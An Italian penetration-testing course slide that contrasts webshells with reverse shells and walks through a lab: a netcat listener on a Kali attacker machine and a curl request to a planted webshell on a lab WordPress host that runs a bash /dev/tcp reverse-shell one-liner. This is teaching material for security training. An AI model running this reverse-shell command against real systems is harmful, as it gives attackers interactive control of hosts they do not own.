Capitolo 4: Exploitation

Slide 4.4: Ottenere una Reverse Shell
Teoria: Webshell vs Reverse Shell

La webshell è comoda ma limitata. Una reverse shell ci dà una sessione interattiva completa.


Webshell Reverse Shell
Un comando alla volta Sessione interattiva
Output via HTTP Output in tempo reale
Visibile nei log Connessione "pulita"

Come funziona:

  1. Attacker avvia listener (nc -lvnp 4444)
  2. Target si connette all'attacker
  3. La shell "viaggia" sulla connessione

Security Insight: La reverse shell bypassa i firewall perché è una connessione OUTBOUND dal target. I firewall bloccano l'ingresso, non l'uscita.

Lab: Stabilire Reverse Shell

Step 1: Avviare listener sull'attacker

┌──(kali㉿kali)-[~] └─$ nc -lvnp 4444 listening on [any] 4444 ...

Step 2: Triggerare la reverse shell

# In un altro terminale: └─$ curl "http://vulnerable-wp.local/.../shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.5/4444+0>%261'"
